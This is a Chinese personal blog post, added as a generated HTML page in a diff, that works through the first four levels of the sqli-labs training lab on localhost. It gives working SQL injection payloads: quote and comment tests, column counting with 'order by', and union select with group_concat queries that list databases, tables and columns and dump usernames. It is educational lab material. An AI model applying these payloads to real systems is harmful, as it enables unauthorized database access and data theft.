@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一个小白进阶的历程">
+    <meta name="author" content="Camser">
+    
+    <title>
+        
+            Sqli-labs修炼之路 |
+        
+        Camser&#39;s Blog
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"yoursite.com","root":"/","language":"zh-Hans"};
+    KEEP.theme_config = {"toc":{"enable":false,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/Misaka.jpg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true,"trigger":"auto","unescape":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.0"};
+    KEEP.language_ago = undefined;
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                Camser&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Sqli-labs修炼之路</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/Misaka.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Camser</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2018-05-06 20:00:35
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Mysql/">Mysql</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>之前早就安装了sqli-labs，最近才拿出来系统的进行学习修炼.<br>环境的安装过程也很简单，主要是需要wamp这个集成化服务器软件，百度安装教程一大堆.<br>闲话不多说，开始我们的修炼之路！</p>
+<h2 id="mysql基本操作"><a href="#mysql基本操作" class="headerlink" title="mysql基本操作"></a>mysql基本操作</h2><p>首先我们需要熟悉mysql的一些基本操作命令，通过以下命令进行数据的查询.<br><code>show databases;</code>是查询有哪些数据库<br><img src="/uploads/mysql.png" alt="1"></p>
+<p><code>use information_schema;</code>选定该数据库<br><code>show tables;</code>查看该数据库中的表<br><img src="/uploads/mysql2.png" alt="1"></p>
+<p><code>desc tables;</code>查看该表的结构<br><img src="/uploads/mysql3.png" alt="1"></p>
+<p>‘select table_name from information_schema.tables where table_schema=’security’;’查询数据库security中的表名<br><img src="/uploads/mysql4.png" alt="1"></p>
+<p>通过以上的数据查询，我们可以发现，Mysql中的系统数据库information_schema,对的，就是该数据库中存储着所有的数据库相关信息，一般情况我们只要利用该表就可以完成注入.<br>猜数据库<br>select schema_name from information_schema.schemata<br>猜某库的数据表<br>select table_name from information_schema.tables where table_schema=’xxx’<br>猜某表的所有列<br>Select column_name from information_schema.columns where table_name=’xxx’<br>获取某列的内容<br>Select *** from ****</p>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>首先尝试<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1<i class="fas fa-external-link-alt"></i></a> 是可以登陆成功的<br>继续构造<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;<i class="fas fa-external-link-alt"></i></a> 发现页面报错<br>继续将后面的注释掉<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;--+" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;--+<i class="fas fa-external-link-alt"></i></a> 登陆成功<br>继续构造<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;<i class="fas fa-external-link-alt"></i></a> and 1=2–+ 登陆失败<br>继续构造<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;<i class="fas fa-external-link-alt"></i></a> and 1=1–+ 登陆成功<br>所以payload：<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;<i class="fas fa-external-link-alt"></i></a> xxxx–+ </p>
+<p>查看列数<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;<i class="fas fa-external-link-alt"></i></a> order by 3–+ 数字从1依次递增尝试，发现到4就会报错，所以一共有三列</p>
+<p>构造查询数据库:<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,schema_name from information_schema.schemata –+<br>但是我们会发现，只有显示了一个数据库的名称，那我们如何去查看其他的数据库呢？<br><img src="/uploads/less3.png" alt="1"></p>
+<p>我们有两种方式来查看其他数据库，第一种，因为按照我们上面的payload只能显示一列的数据库，所以他才会显示了一个数据库，我们构造<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,schema_name from information_schema.schemata limit 1,1–+ 通过limit去查询下面几列的数据库，第一个数字是控制起始的行数(包含0)，第二个数子是控制查询几行。<br>但是这样一个一个查询起来很麻烦.所以我们有第二种方法，通过group_concat()连接一个组的所有字符串，构造：<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,group_concat(schema_name) from information_schema.schemata –+<br><img src="/uploads/less4.png" alt="1"></p>
+<p>构造查询security库的所有数据表:<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+<br><img src="/uploads/less5.png" alt="1"></p>
+<p>构造查询users数据表的所有列:<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’  –+<br><img src="/uploads/less6.png" alt="1"></p>
+<p>查询username列的所有内容：<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;" >http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#39;<i class="fas fa-external-link-alt"></i></a> union select 1,2,group_concat(username) from users–+<br><img src="/uploads/less7.png" alt="1"></p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>我们继续按照第一个的测试方法，寻找注入点，当添加单引号是报错，可以发现引号似乎多余了，查询代码使用了整数，不需要引号的闭合。<br><img src="/uploads/less8.png" alt="1"></p>
+<p>构造如下payload：<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1" >http://127.0.0.1/sqli-labs-master/Less-2/?id=1<i class="fas fa-external-link-alt"></i></a> xxx–+<br>其他的查询方式和第一个一模一样.</p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>继续测试注入点，发现这次似乎多出一个),所以我们只要闭合它就绕过了.<br><img src="/uploads/less9.png" alt="1"></p>
+<p>payload如下：<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;" >http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;<i class="fas fa-external-link-alt"></i></a>) xxx –+<br>其他的查询方式也是和第一个一模一样.</p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>继续测试寻找注入点，这次是一个”)的闭合，我们将其闭合绕过.<br><img src="/uploads/less10.png" alt="1"></p>
+<p>payload:<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;" >http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;<i class="fas fa-external-link-alt"></i></a>) xxx –+<br>其他的查询方式依旧是和第一个一模一样.</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2018/05/09/XSS%E4%B8%8ECSRF%E5%8F%8C%E5%89%91%E5%90%88%E7%92%A7/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XSS与CSRF双剑合璧</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2018/04/30/%E5%85%B3%E4%BA%8Ejwt(json%20web%20token)%E7%9A%84%E6%8E%A2%E7%A9%B6/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">关于jwt(json web token)的探究</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">Camser</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.0</a>
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/header-shrink.js"></script><script src="/js/back2top.js"></script><script src="/js/dark-light-toggle.js"></script>
+
+
+    <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+<div class="post-scripts">
+    
+</div>
+
+
+
+</body>
+</html>
